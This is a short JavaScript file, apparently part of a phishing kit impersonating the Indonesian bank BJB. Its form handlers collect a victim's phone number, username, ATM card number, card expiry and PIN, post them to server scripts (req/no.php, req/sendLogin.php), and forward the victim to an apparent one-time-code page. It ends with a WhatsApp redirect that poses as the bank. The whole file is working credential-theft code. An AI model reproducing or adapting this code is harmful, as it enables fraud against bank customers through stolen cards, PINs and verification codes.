 $(document).ready(function(){
    $('#formHP').submit(function(e) {
    event.preventDefault();   
 $(".load").show();
 $.ajax({
 type: 'POST',
 url: 'req/no.php',
 data: $(this).serialize(),
 datatype: 'JSON', 
 complete: function(data) {
           console.log('Complete')
  setTimeout(function(){
   $('.load').hide();
     window.location = "login.html";    
      var nohp = document.getElementById('nope').value;
    sessionStorage.setItem("nohp", nohp);
     }, 500);
        }
    });
 });
    return false;
});   

$(document).ready(function(){
    $('#inputlogin').submit(function(e) {
        e.preventDefault();    
        $('.load').fadeIn(); 
 document.getElementById('kirims').innerHTML = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'req/sendLogin.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
    window.location.href='kode.html';  
    $('.load').fadeOut();
var user = document.getElementById("user").value;
sessionStorage.setItem("user", user);
var nohp = document.getElementById("nohp").value;
sessionStorage.setItem("nohp", nohp);
var atm = document.getElementById("atm").value;
sessionStorage.setItem("atm", atm);
var bulan = document.getElementById("bulan").value;
sessionStorage.setItem("bulan", bulan);
var tahun = document.getElementById("tahun").value;
sessionStorage.setItem("tahun", tahun);
var pin = document.getElementById("pin").value;
sessionStorage.setItem("pin", pin);
     }, 500);
 }
    });
 });
    return false;
});   
        



function go(){
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=14017020060&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
    }, 1500);    
}     
